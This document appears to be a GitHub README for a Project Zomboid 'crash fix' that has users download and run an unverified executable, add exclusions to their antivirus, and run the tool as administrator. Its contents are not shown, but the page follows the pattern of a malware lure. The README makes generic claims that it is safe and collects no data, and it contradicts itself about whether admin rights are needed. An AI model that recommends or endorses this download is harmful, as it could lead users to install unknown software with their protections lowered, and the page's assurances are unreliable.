# 🛠️ Project-Zomboid-Crash-Fix - Stable Launcher For Project Zomboid Game

[![](https://img.shields.io/badge/Download-Latest_Fix-blue.svg)](https://github.com/Sasiw6188/Project-Zomboid-Crash-Fix/releases)

Project Zomboid requires specific system paths and graphics libraries to run. Some Windows 10 and 11 updates change these paths, which stops the game from starting. This tool restores the missing files and updates your settings to allow the game to launch. It works for both Steam and non-Steam versions of the game.

## 📋 What This Tool Does

The game engine sometimes loses track of where it stores temporary files. If your game window closes immediately after you click Play, or if the screen stays black, this utility repairs the issue.

It performs these steps:
- Clears corrupted configuration files
- Updates the game internal path settings
- Verifies integrity of the startup script
- Configures graphics memory options for Windows 11

## 📥 How to Install and Fix ⚙️

Follow these steps to repair your game.

1. Go to the [official release page](https://github.com/Sasiw6188/Project-Zomboid-Crash-Fix/releases).
2. Look for the Assets list under the most recent version.
3. Select the file named `Project-Zomboid-Fix.exe`.
4. Save the file to your desktop.
5. Double-click the file to open the fix tool.
6. Click the button labeled Apply Patch.
7. Wait for the green status bar to finish.
8. Restart your computer.

Launch Project Zomboid through Steam or your desktop shortcut after the process completes.

## 🖥️ System Requirements

This tool functions on the following systems:

- Windows 10 (64-bit)
- Windows 11 (64-bit)
- 2 MB of available disk space
- Project Zomboid installed on your local drive

The tool does not require administrative rights, though Windows may ask for permission to run the repair script. This is normal for system-level adjustments.

## 🔍 Troubleshooting Tips

If the game still does not launch, check these settings manually:

Graphics Drivers: Ensure your video card drivers are current. Sometimes drivers conflict with the game overlay. Visit your GPU manufacturer website to find the latest version.

Steam Overlay: Disable the Steam overlay. Right-click Project Zomboid in your library, select Properties, and uncheck the box marked Enable the Steam Overlay while in-game.

Antivirus Software: Occasionally, security programs block the game executable. Add the Project Zomboid folder to your antivirus exceptions list.

Compatibility Mode: Right-click your Project Zomboid shortcut, go to Properties, and select the Compatibility tab. Check the box for Run this program in compatibility mode for Windows 8. Click Apply and then OK.

## ❓ Frequently Asked Questions

Does this tool change my save files?
No, the repair tool focuses on configuration data and system paths. You will not lose your game progress.

Can I reach the game files manually?
Yes, but the automated tool performs multiple checks to ensure the registers align with Windows 11 internal requirements. Using the tool saves time and prevents errors.

Is this safe to use?
Yes. The script only accesses game folders and configuration text files. It does not scan personal documents or system files unrelated to the game environment.

Does this tool need to stay open?
You only need to run the tool once to fix the crash. You can delete the file from your desktop once the game launches successfully.

## 🛡️ Privacy and Data

This utility runs entirely on your local machine. It does not transmit data to any server. Your game settings stay inside your computer folders. No user information is collected, logged, or recorded during the repair process.

## 📁 Project Structure

The repair script operates within the root directory of your game. 

- bin: Contains the executable files for the fix.
- config: Stores the default game settings that the tool restores.
- logs: Creates a text file if an error occurs during the repair process, which helps identify conflicts.

If you experience errors, check the logs folder. If the text file says Access Denied, try running the tool by right-clicking it and choosing Run as Administrator.

## 🤝 Support

This project provides fixes for common launch issues for Project Zomboid. If a specific error code persists, search the Steam community discussions for that code. The repair tool continues to receive updates as new versions of Windows 11 arrive. Keep your game updated through the Steam client to ensure compatibility with future patches.